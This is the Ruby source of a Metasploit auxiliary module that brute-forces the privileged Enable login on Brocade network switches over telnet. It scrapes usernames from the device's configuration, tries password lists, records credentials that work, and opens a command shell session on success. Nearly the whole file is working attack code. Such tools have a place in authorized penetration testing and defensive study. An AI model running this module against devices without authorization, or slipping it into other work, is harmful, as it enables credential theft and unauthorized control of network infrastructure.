##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/brocade_telnet'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::Telnet
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell

  def initialize
    super(
      'Name'        => 'Brocade Enable Login Check Scanner',
      'Description' => %q{
        This module will test a Brocade network device for a privilged
        (Enable) login on a range of machines and report successful
        logins.  If you have loaded a database plugin and connected
        to a database this module will record successful
        logins and hosts so you can track your access.
        This is not a login/telnet authentication.  Config should NOT
        have 'enable telnet authentication' in it.  This will test the
        config that contains 'aaa authentication enable default local'
        Tested against:
              ICX6450-24 SWver 07.4.00bT311
              FastIron WS 624 SWver 07.2.02fT7e1
      },
      'Author'      => 'h00die <mike[at]shorebreaksecurity.com>',
      'References'  =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )
    register_options(
      [
        OptBool.new('GET_USERNAMES_FROM_CONFIG', [ false, 'Pull usernames from config and running config', true])
      ], self.class
    )
  @no_pass_prompt = []
  end

  def get_username_from_config(un_list,ip)
    ["config","running-config"].each do |command|
      print_status(" Attempting username gathering from #{command} on #{ip}")
      sock.puts("\r\n") #ensure the buffer is clear
      config = sock.recv(1024)
      sock.puts("show #{command}\r\n")
      while true do
        sock.puts(" \r\n") #paging
        config << sock.recv(1024)
        #there seems to be some buffering issues. so we want to match that we're back at a prompt, as well as received the 'end' of the config.
        break if config.match(/>$/) and config.match(/end/)
      end #pull the entire config
      config.each_line do |un|
        if un.match(/^username/)
          found_username = un.split(" ")[1].strip
          un_list.push(found_username)
          print_status("   Found: #{found_username}@#{ip}")
        end #username match
      end #each line in config
    end #end config/running-config loop
  end

  attr_accessor :no_pass_prompt
  attr_accessor :password_only

  def run_host(ip)
    un_list = []
    if datastore['GET_USERNAMES_FROM_CONFIG']
        connect()
        get_username_from_config(un_list,ip)
        disconnect()
    end

    if datastore['USERNAME'] #put the provided username on the array to try
        un_list.push(datastore['USERNAME'])
    end

    un_list.delete('logout') #logout, even when used as a un or pass will exit the terminal

    un_list.each do |un|
      cred_collection = Metasploit::Framework::CredentialCollection.new(
          blank_passwords: datastore['BLANK_PASSWORDS'],
          pass_file: datastore['PASS_FILE'],
          password: datastore['PASSWORD'],
          user_file: datastore['USER_FILE'],
          userpass_file: datastore['USERPASS_FILE'],
          username: un,
          user_as_pass: datastore['USER_AS_PASS'],
      )

      cred_collection = prepend_db_passwords(cred_collection)

      scanner = Metasploit::Framework::LoginScanner::Brocade_Telnet.new(
          host: ip,
          port: rport,
          proxies: datastore['PROXIES'],
          cred_details: cred_collection,
          stop_on_success: datastore['STOP_ON_SUCCESS'],
          bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
          connection_timeout: datastore['Timeout'],
          max_send_size: datastore['TCP::max_send_size'],
          send_delay: datastore['TCP::send_delay'],
          banner_timeout: datastore['TelnetBannerTimeout'],
          telnet_timeout: datastore['TelnetTimeout'],
          framework: framework,
          framework_module: self,
      )

      scanner.scan! do |result|
        credential_data = result.to_h
        credential_data.merge!(
            module_fullname: self.fullname,
            workspace_id: myworkspace_id
        )
        if result.success?
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
          start_telnet_session(ip,rport,result.credential.public,result.credential.private,scanner)
        else
          invalidate_login(credential_data)
          print_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})")
        end
      end
    end #end un loop
  end

  def start_telnet_session(host, port, user, pass, scanner)
    print_status("Attempting to start session #{host}:#{port} with #{user}:#{pass}")
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => user,
      'PASSWORD'      => pass
    }

    start_session(self, "TELNET #{user}:#{pass} (#{host}:#{port})", merge_me, true, scanner.sock)
  end
end
